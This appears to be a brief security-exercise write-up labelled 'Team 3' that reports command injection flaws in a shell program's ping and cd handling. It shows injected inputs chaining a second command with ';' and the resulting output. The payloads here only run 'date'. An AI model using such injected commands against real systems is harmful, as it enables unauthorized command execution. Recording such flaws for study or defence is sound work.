## Team 3

> There is no automated client so no exploit scripts

### Command Injection

* Commands are not being sanitized for ping. We can use ; and the command we want to inject
```
Enter input: ping google.com -c 1; date; #
PING google.com (216.58.192.142) 56(84) bytes of data.
64 bytes from ord36s01-in-f14.1e100.net (216.58.192.142): icmp_seq=1 ttl=52 time=7.51 ms

--- google.com ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 7.512/7.512/7.512/0.000 ms
Mon Mar 26 21:31:33 EDT 2018
mc02 184 $

```

* cd command is directly passed to system.
```
Enter input: cd lol;date
Mon Mar 26 21:39:03 EDT 2018
mc02 198 $ 

```
